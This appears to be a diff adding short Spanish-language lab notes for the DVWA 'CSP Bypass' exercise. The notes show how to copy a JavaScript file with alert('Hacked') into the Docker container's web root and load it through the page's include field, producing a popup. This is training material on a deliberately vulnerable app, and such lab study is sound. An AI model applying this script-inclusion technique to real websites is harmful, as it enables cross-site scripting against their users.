@@ -1,0 +1,18 @@
+++ Web Browser
+--- dvwa security = low
+--- CSP Bypass 
+
+++ Terminal
+-- docker ps (Sólo para confirmar que el contenedor de dvwa está funcionando)
+-- Podemos observar la ip asociada al contenedor: 127.8.0.1:80 
+-- Procedemos a escribir el siguiente script:
+--- echo "alert('Hacked');" > sc.js ---> Enter
+--- docker cp sc.js dvwa:/var/www/html/sc.js (Nos permite copiar el archivo creado en el directorio asociado al contenedor)
+
+++ Web Browser
+--- 127.8.0.1/sc.js ---> nos aparece el contenido del archivo .js
+--- Copiamos el url 
+--- Volvemos a la pestaña de CSP Bypass 
+--- Pegamos el url en el campo ---> include 
+--- Nos aparece un popup con el mensaje: hacked
+--- Esto nos indica que la web es débil y ejecuta el script sin realizar validaciones previamente
